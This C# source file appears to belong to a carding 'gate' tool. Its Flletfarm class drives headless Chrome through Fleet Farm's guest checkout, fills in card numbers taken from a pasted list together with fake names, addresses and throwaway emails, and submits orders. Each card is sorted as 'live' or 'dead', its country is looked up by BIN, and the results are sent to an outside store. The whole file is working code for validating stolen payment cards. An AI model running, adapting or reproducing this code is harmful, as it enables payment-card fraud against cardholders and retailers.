using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Flletfarm
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        string producto;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {


                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();
                Form1.circularProgressBar1.Value = 5;
                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--headless");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.fleetfarm.com/promotion/p720054/_/N-2475368737#/promotion/p720054/_/N-2475368737?null&Ns=sku.activePrice|0&_=1602093691497&Nrpp=48";
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";


                if (IsElementPresent(By.Id("ltkpopup-content")))
                {
                    driver.ExecuteJavaScript("document.querySelector('#ltkpopup-close-button > a').click();");
                }

                Thread.Sleep(300);

                producto = "/html/body/div[3]/div/div[1]/section[2]/div[2]/div[4]/ul/li[" + RandomNumber(1, 48) + "]/div/div[1]/a";

                if (tiempoElemento(By.XPath(producto)))
                {
                    Form1.circularProgressBar1.Value = 20;
                    var pro = driver.FindElement(By.XPath("/html/body/div[3]/div/div[1]/section[2]/div[2]/div[4]/ul/li[2]/div/div[1]/a"));
                    driver.Navigate().GoToUrl( pro.GetAttribute("href"));
                    Thread.Sleep(300);
                    if (IsElementPresent(By.Id("product-size-in-inches")))
                    {
                        Form1.circularProgressBar1.Value = 30;
                        var selc = new SelectElement(driver.FindElement(By.Id("product-size-in-inches")));
                        selc.SelectByIndex(1);

                        Thread.Sleep(1000);
                       

                    }
                    else
                    {
                        Thread.Sleep(300);
                    }

                }
                else
                {
                    restart();
                }

                if (tiempoElemento(By.XPath("//*[@id='add-to-cart-form']/div[3]/a")))
                {
                    Form1.circularProgressBar1.Value = 50;
                    driver.FindElement(By.XPath("//*[@id='add-to-cart-form']/div[3]/a")).Click();
                    Thread.Sleep(1000);
                    driver.Navigate().GoToUrl("https://www.fleetfarm.com/checkout/cart.jsp");
                    Thread.Sleep(1000);
                }
                else
                {
                    restart();
                }

               

                driver.ExecuteJavaScript("document.querySelector('#moveToPurchaseInfo').click();");
                Thread.Sleep(1000);

                //invitado

                if (tiempoElemento(By.XPath("//*[@id='guest-checkout-form']/div/a")))
                {
                    driver.FindElement(By.XPath("//*[@id='guest-checkout-form']/div/a")).Click();
                }
                else
                {
                    restart();
                }

                Thread.Sleep(1000);

                if (tiempoElemento(By.Name("firstName")))
                {
                    Form1.circularProgressBar1.Value = 70;
                    driver.FindElement(By.Name("firstName")).SendKeys("Joseph");
                    driver.FindElement(By.Name("lastName")).SendKeys("Brow");
                    driver.FindElement(By.Name("address1")).SendKeys("street 356");
                    driver.FindElement(By.Name("city")).SendKeys("NEW YORK");
                    var state=new SelectElement( driver.FindElement(By.Name("state")));
                    state.SelectByValue("NY");
                    driver.FindElement(By.Name("zip")).SendKeys("10001");
                    driver.FindElement(By.Name("phoneNumber")).SendKeys("2135269874");

                    Thread.Sleep(1000);
                    driver.FindElement(By.Name("address-submit")).Submit();
                }

                Thread.Sleep(500);
                //validar direccion

                if (IsElementPresent(By.XPath("//*[@id='avsModal']/div[2]/div[1]/div/div/div[2]/ul/li[2]/div/div[3]/a")))
                {
                    driver.FindElement(By.XPath("//*[@id='avsModal']/div[2]/div[1]/div/div/div[2]/ul/li[2]/div/div[3]/a")).Click();
                }

                Thread.Sleep(500);

                //metodo de envio
                if (tiempoElemento(By.Name("method-submit")))
                {
                    driver.FindElement(By.Name("method-submit")).Click();
                }
                else
                {
                    restart();
                }

                Thread.Sleep(500);


                if (tiempoElemento(By.Name("card-type")))
                {
                    pago();
                }
                else
                {
                    restart();
                }

   

            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }


        public void stop()
        {
            try
            {
                driver.Close();
                driver.Quit();
                pagos = 0;
            }
            catch (Exception)
            {

                driver.Quit();
                pagos = 0;
            }
        }

        private void restart()
        {
            try
            {
                 pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {

                
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 5)
                    {
                        Form1.circularProgressBar1.Value = 90;
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        var select_card = new SelectElement(driver.FindElement(By.Name("card-type")));
                        if (ccnum[0].ToString() == "4")
                        {
                            select_card.SelectByValue("visa");
                        }

                        if (ccnum[0].ToString() == "5")
                        {
                            select_card.SelectByValue("masterCard");

                        }

                        if (ccnum[0].ToString() == "6")
                        {
                            select_card.SelectByValue("discover");

                        }

                        if (ccnum[0].ToString() == "3")
                        {
                            select_card.SelectByValue("americanExpress");

                        }

                        Thread.Sleep(500);
                        driver.FindElement(By.Name("card-number")).SendKeys(ccnum);
                        Thread.Sleep(300);
                        if (pagos == 0)
                        {
                            driver.FindElement(By.Name("name")).SendKeys("JOSEPHT BROWN");
                            Thread.Sleep(300);
                        }
                       
                        var mes=new SelectElement( driver.FindElement(By.Name("month")));
                        mes.SelectByValue(ccLine[1]);
                        Thread.Sleep(300);
                        var anio = new SelectElement(driver.FindElement(By.Name("year")));
                        anio.SelectByValue(ccLine[2]);
                        Thread.Sleep(300);


                        if (pagos == 1)
                        {
                            if (ccLine[3].Length == 3)
                            {
                                driver.FindElement(By.Name("cvv")).SendKeys("000");
                            }
                            else if (ccLine[3].Length == 4)
                            {
                                driver.FindElement(By.Name("cvv")).SendKeys("0000");
                            }
                        }
                        else
                        {
                            if (ccLine[3].Length == 3)
                            {
                                driver.FindElement(By.Name("cvv")).SendKeys("000"+Keys.Enter);
                            }
                            else if (ccLine[3].Length == 4)
                            {
                                driver.FindElement(By.Name("cvv")).SendKeys("0000" + Keys.Enter);
                            }
                        }

                      

                        Thread.Sleep(500);

                        if (pagos == 1)
                        {
                            driver.FindElement(By.Name("email")).SendKeys(correo+Keys.Enter);

                            Thread.Sleep(500);
                        }
                       

                       

                        Thread.Sleep(500);

                        if (tiempoElemento(By.Id("commit-order")))
                        {
                            driver.FindElement(By.Id("commit-order")).Submit();
                            Thread.Sleep(500);
                        }
                        else
                        {
                            restart();
                        }

                        //for (var i = 0; i <= ccnum.Length - 1; i++)
                        //{
                        //    if (i == 0)
                        //    {
                        //        Thread.Sleep(500);
                        //    }
                        //    driver.FindElement(By.Id("number")).SendKeys(ccnum[i].ToString());
                        //    if (i == 0)
                        //    {
                        //        Thread.Sleep(500);
                        //    }
                        //    Thread.Sleep(300);
                        //}
                        Thread.Sleep(200);

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6))+" "+Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc);
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6))+" "+Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                restart();
            }

        }

    

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {


                    if (IsElementPresent(By.XPath("//*[@id='submitOrderForm']/div[1]/p")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='submitOrderForm']/div[1]/p")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='submitOrderForm']/div[1]/p")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div[3]/div/div[1]/section[1]/div[1]/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[3]/div/div[1]/section[1]/div[1]/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[3]/div/div[1]/section[1]/div[1]/h1")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                            
                        }
                    }

                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {

                driver.FindElement(By.XPath("//*[@id='submitOrderForm']/div[2]/a")).Click();
                Thread.Sleep(500);
                if (tiempoElemento(By.Name("method-submit")))
                {
                    driver.FindElement(By.Name("method-submit")).Submit();
                }
                else
                {
                    restart();
                }

                if (tiempoElemento(By.Name("card-type")))
                {
                    driver.FindElement(By.Name("card-number")).Clear();
                    Thread.Sleep(300);
                    driver.FindElement(By.Name("cvv")).Clear();

                    Thread.Sleep(500);
                }
                else
                {
                    restart();
                }

                Thread.Sleep(300);

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

